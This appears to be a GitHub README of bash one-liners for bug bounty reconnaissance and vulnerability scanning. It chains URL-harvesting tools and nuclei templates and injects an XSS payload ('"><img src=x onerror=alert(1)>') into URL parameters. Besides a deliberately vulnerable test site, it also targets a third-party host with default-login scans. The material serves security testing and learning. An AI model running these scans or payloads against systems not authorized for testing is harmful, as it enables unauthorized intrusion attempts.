# SIMPLE ONE LINER
One Liner for Bug Bounty Hunting by `RootBakar`

### Command 1:
```bash
echo "testphp.vulnweb.com" | waybackurls | urldedupe -qs -s > waybck_results.txt
```
```bash
echo "testphp.vulnweb.com" | gau | urldedupe -qs -s > gau_results.txt
```
```bash
cat waybck_results.txt gau_results.txt | anew combine.txt
```

### Command 2: (Combine with RB XSS Validator)
```bash
cat combine.txt
```
### Result:
![image](https://github.com/user-attachments/assets/86beb41e-5c15-4a49-a976-fd216f75de1d)

### Command 3:
```bash
echo "testphp.vulnweb.com" | waybackurls | urldedupe -s -qs -ne | gf xss | qsreplace '"><img src=x onerror=alert(1)>' | freq | egrep -v 'Not'
```
### Result:
<img width="1440" alt="image" src="https://github.com/user-attachments/assets/1c80107a-708f-461e-8af7-44f323d6082d">

### Command 4:
```bash
echo "testphp.vulnweb.com" | gau --fc 200 | urldedupe -s -qs | gf lfi redirect sqli-error sqli ssrf ssti xss xxe | qsreplace FUZZ | grep FUZZ | nuclei -silent -t ~/nuclei-templates/dast/vulnerabilities -dast
```
### Result:
<img width="1440" alt="image" src="https://github.com/user-attachments/assets/3ec661fb-63f3-4d75-a3e3-c163ac96c506">

### Command 5:
```bash
echo "testphp.vulnweb.com" | gau --fc 200 | urldedupe -s -qs -ne | gf xss | qsreplace '"><img src=x onerror=alert(1)>' | freq | egrep -v 'Not'
```
### Result:
<img width="1440" alt="image" src="https://github.com/user-attachments/assets/40e8eb4a-8360-4c3f-9421-ceece6e0a5ba">

### Command 6:
```bash
echo "p1.hol.es" | nuclei -t ~/nuclei-templates/http/exposed-panels
```
```bash
nuclei -target http://p1.hol.es/ -t ~/nuclei-templates/http/exposed-panels
```
### Result:
<img width="1045" alt="image" src="https://github.com/user-attachments/assets/146d68a0-fc55-4cc6-9d26-b2acd922e976">

### Command 7:
```bash
echo "p1.hol.es" | nuclei -t ~/nuclei-templates/http/exposures
```
```bash
nuclei -target http://p1.hol.es/ -t ~/nuclei-templates/http/exposures
```
### Result:
<img width="1045" alt="image" src="https://github.com/user-attachments/assets/d295f119-d93f-40dd-bc87-6def98789081">

### Command 8:
```bash
echo "p1.hol.es" | nuclei -t ~/nuclei-templates/http/default-logins
```
```bash
nuclei -target http://p1.hol.es/ -t ~/nuclei-templates/http/default-logins
```
```bash
echo "p1.hol.es" | nuclei -t ~/nuclei-templates/default-logins
```
```bash
nuclei -target http://p1.hol.es/ -t ~/nuclei-templates/default-logins
```
### Result:
<img width="1417" alt="image" src="https://github.com/user-attachments/assets/231d6c59-1586-4b00-9ea2-106a02310502">

### Command 9:
```bash
echo "p1.hol.es" | nuclei -t ~/nuclei-templates/http/vulnerabilities/wordpress
```
```bash
nuclei -target http://p1.hol.es/ -t ~/nuclei-templates/http/vulnerabilities/wordpress
```
### Result:
<img width="1211" alt="image" src="https://github.com/user-attachments/assets/e4cf7527-bcba-4b5f-a43e-c470912dce4f">

### Command 10:
```bash
echo "p1.hol.es" | nuclei -t ~/nuclei-templates/http/vulnerabilities/
```
```bash
nuclei -target http://p1.hol.es/ -t ~/nuclei-templates/http/vulnerabilities/
```
### Result:
<img width="1211" alt="image" src="https://github.com/user-attachments/assets/e13e9520-c410-48d0-8c3d-2b882b21e2b8">

### Command 11: (Combine with RB XSS Validator)
```bash
echo "testphp.vulnweb.com" | httpx -silent | katana -silent > katana.txt; echo "testphp.vulnweb.com" | httpx -silent | hakrawler -u > hakrawler.txt; cat katana.txt hakrawler.txt | urldedupe -qs > finish.txt
```
```bash
cat finish.txt
```
### Result:
<img width="1440" alt="image" src="https://github.com/user-attachments/assets/8d2b639e-0c87-4f56-9319-8cb88f803b51">
<img width="1348" alt="image" src="https://github.com/user-attachments/assets/9106c3fb-727e-4c43-8cf2-02b07f640f15">


### Command 12: (Combine with RB XSS Validator)
```bash
echo "testphp.vulnweb.com" | waybackurls > waybackurls.txt; echo "testphp.vulnweb.com" | gau > gau.txt; cat waybackurls.txt gau.txt | urldedupe -qs | httpx -silent -mc 200 > finish2.txt
```
```bash
cat finish2.txt
```
### Result:
<img width="1440" alt="image" src="https://github.com/user-attachments/assets/d92121a9-13bd-46cf-bb74-3bff26a55cf0">
<img width="1348" alt="image" src="https://github.com/user-attachments/assets/16eb47d3-a652-4edb-b498-cc3446faa1d0">

### Command 13:
```bash
subfinder -d example.com -o subs-example.txt
```
```bash
cat subs-example.txt | httpx -silent | anew subs-example-alive.txt
```
```bash
cat subs-example.txt | httpx -silent -status-code -title
```
```bash
nuclei -list subs-example-alive.txt -t ~/nuclei-templates/http/exposures
```
```bash
nuclei -list subs-example-alive.txt -t ~/nuclei-templates/http/default-logins
```
